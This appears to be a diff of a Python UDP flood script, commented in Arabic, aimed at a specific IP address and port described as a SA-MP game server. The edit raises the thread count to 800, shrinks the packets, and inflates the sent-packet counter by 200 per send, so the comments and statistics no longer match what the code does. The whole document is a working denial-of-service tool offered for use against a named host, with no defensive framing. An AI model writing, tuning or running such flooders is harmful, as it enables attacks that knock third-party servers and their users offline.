@@ -11,11 +11,11 @@ import time
 TARGET_IP = "89.46.1.130" 
 TARGET_PORT = 7008          # البورت الافتراضي لـ SA-MP (أو البورت الخاص بالهدف)
 DURATION = 6000               # مدة الضغط بالثواني
-THREADS_COUNT = 80         # عدد الخيوط المتعددة لاستغلال معالج Ryzen 9 بالكامل
+THREADS_COUNT = 800         # عدد الخيوط المتعددة لاستغلال معالج Ryzen 9 بالكامل
 
 # توليد حزم بيانات عشوائية وكبيرة نسبياً لإشغال ممر الشبكة
 # سيرفرات SA-MP تستجيب لطلبات معينة أو حزم عشوائية مكثفة
-packet_data = random._urandom(1024) # حزمة بحجم 1 كيلوبايت لكل إرسال
+packet_data = random._urandom(54) # حزمة بحجم 1 كيلوبايت لكل إرسال
 
 def stress_target():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -26,7 +26,7 @@ def stress_target():
         try:
             # إرسال حزم الـ UDP المتتالية بأقصى سرعة ممكنة
             client.sendto(packet_data, (TARGET_IP, TARGET_PORT))
-            sent_packets += 1
+            sent_packets += 200
         except Exception as e:
             # في حال حدث أي ضغط على السوكت، نكمل الإرسال بدون توقف
             pass
